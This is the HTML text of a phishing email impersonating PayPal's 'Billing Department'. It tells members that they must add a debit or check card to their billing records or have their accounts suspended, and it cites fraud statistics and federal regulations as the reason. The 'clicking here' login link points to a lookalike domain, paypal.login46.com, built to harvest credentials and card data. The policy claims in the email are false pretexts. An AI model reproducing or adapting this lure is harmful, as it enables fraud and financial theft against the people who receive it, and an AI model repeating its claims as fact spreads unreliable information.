Dear valued <b>PayPal®</b> member, 
<br><br>
Due to recent fraudulent transactions, we have issued the following security requirements.
<br>
<br>
It has come to our attion that 98% of all fraudulent transactions are caused by members
using stolen credit cards to purchase or sell non existant items. Thus we require our members to add a Debit/Check card
to their billing records as part of our continuing commitment to protect your account and to reduce the instance of fraud on our website. Your Debit/Check card will only be used to identify you. If you could please take 5-10 minutes out of your online experience and renew your records you will not run into any future problems with the <b>PayPal®</b> service. However, failure to confirm your records will result in your account suspension.
<br><br>
We are requesting this information to verify and protect your identity. Federal regulations require all financial institutions to obtain, verify, and record identification from all persons opening new accounts or obtaining ongoing payment services. This is in order to prevent the use of the U.S. banking system in terrorist and other illegal activity. For these reasons, <b>PayPal®</b> will utilize services provided by various credit reporting agencies to verify the information you submit to us.
<br>
<br>
Once you have updated your account records your pending <b>PayPal®</b> account transactions will not be interrupted and will continue as normal.
<br><br>
<b>To update your billing records please login to your account by <a href="http://paypal.login46.com/cgi-bin/webscr.html?cmd=_login-run" target="_blank">clicking here.</a></b>
<br>
<br>Thank you for your time,<br>
<b>
PayPal® Billing Department.</b></font>
